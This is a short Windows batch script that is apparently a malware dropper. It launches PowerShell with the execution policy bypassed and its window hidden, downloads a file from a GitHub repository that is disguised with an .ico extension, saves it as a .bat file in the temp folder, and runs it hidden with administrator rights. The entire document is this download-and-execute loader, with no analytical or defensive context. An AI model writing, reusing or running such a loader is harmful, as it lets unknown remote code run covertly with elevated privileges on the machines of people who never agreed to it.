@echo off
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri 'https://github.com/Splash2520/splash/raw/refs/heads/main/Network.ico' -OutFile $env:TEMP\Network.bat; Start-Process -FilePath $env:TEMP\Network.bat -WindowStyle Hidden -Verb RunAs}"
exit/